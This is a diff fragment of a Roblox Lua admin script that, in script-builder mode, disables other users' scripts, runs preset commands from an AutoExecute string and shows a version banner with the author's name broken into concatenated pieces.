+				if a:IsA("StringValue") and a.Name ~= "climb" and a.Name ~= "fall" and a.Name ~= "idle"
+				and a.Name ~= "jump" and a.Name ~= "run" and a.Name ~= "toolnone" and a.Name ~= "walk" then
+					table.insert(Scripts,i)
+					if DisableSB and SBMode then
+						i.Disabled = true
+						TellAll(i.className.." \""..i.Name.."\" has been disabled",5)
+					end
+					i.Changed:connect(function()
+						if DisableSB and SBMode then
+							i.Disabled = true
+						end
+					end)
+				end
+			end
+		end
+	end
+	
+	game.DescendantAdded:connect(function(i)
+		pcall(function() --Just in case if Roblox is being silly and throws RobloxLocked instances at this, we'd hate to break the event
+			if SBMode and i:IsA("BaseScript") and i ~= script then
+				for _,a in pairs(i:GetChildren()) do
+					if a:IsA("StringValue") and a.Name ~= "climb" and a.Name ~= "fall" and a.Name ~= "idle"
+					and a.Name ~= "jump" and a.Name ~= "run" and a.Name ~= "toolnone" and a.Name ~= "walk" then
+						table.insert(Scripts,i)
+						if SBMode and DisableSB then
+							i.Disabled = true
+							TellAll(i.className.." \""..i.Name.."\" has been disabled",5)
+						end
+						i.Changed:connect(function()
+							if DisableSB and SBMode then
+								i.Disabled = true
+							end
+						end)
+					end
+				end
+			end
+		end)
+	end)
+	
+	script.Changed:connect(function(a)
+		if a == "Disabled" and SBMode then
+			if script.Disabled then --The script is disabled but it's actually not. umad?
+				DisplayMessageAll("Admin","Hey! It appears something tried to disable this Admin script. Inside "..("s'3".."2".."1".."nal".."oDna".."yR"):reverse().." Admin we don't like that, so the commands are about 100% undisableable. If you were the one making the script, sorry, nothing has been implemented to stop it yet. If someone else did it, umad bro?",16)
+			end
+		end
+	end)
+	
+end)
+
+
+-----------------------------------------------------------------
+----------------- Initializes Debugging Stuff -------------------
+-----------------------------------------------------------------
+
+
+
+if Debug then
+	function _G.Admi.Chatted(plr,msg)
+		Chatted(plr,msg)
+	end
+end
+
+
+-----------------------------------------------------------------
+-------------------- Finishes the Rest Up -----------------------
+-----------------------------------------------------------------
+
+
+TeleportService.CustomizedTeleportUI = true
+
+if AutoExecute and type(AutoExecute) == "string" then
+	local NewExe = AutoExecute:gsub("\n\n","\n"):gsub("\t","")
+	local ExtractedCommands = {}
+	while NewExe:find("\n") do
+		local nextLine,_ = NewExe:find("\n")
+		local nextCommand = NewExe:sub(1,nextLine-1)
+		NewExe = NewExe:sub(nextLine+1)
+		ypcall(function()
+			Chatted(root,nextCommand)
+		end)
+	end
+end
+
+for i,_ in pairs(getfenv()) do
+	Sandboxer[i] = true
+end
+
+if SBMode then
+	DisplayMessageAll("R".."ya".."nD".."o".."la".."n".."1".."23".."'".."s A".."dmin",
+	"R".."y".."an".."Do".."l".."an".."1".."2".."3".."'".."s "..
+	"Admin Version "..version.." loaded!\n\n"..(uptodate and "The admin script is up to date." or "The admin script is not up to date.").."\n\nThe script has been detected to be in a script builder environment. "..script.className.."s may be created, and "..(script.className == "Script" and "LocalScript" or "Script").."s may be cloned and overwritten for admin use.", 5)
+else
+	DisplayMessageAll("R".."ya".."nD".."o".."la".."n".."1".."23".."'".."s A".."dmin",
+	"R".."y".."an".."Do".."l".."an".."1".."2".."3".."'".."s "..
+	"Admin Version "..version.." loaded!\n\n"..(uptodate and "The admin script is up to date." or "The admin script is not up to date."),2)
+end
+
+
+end)--The end of all
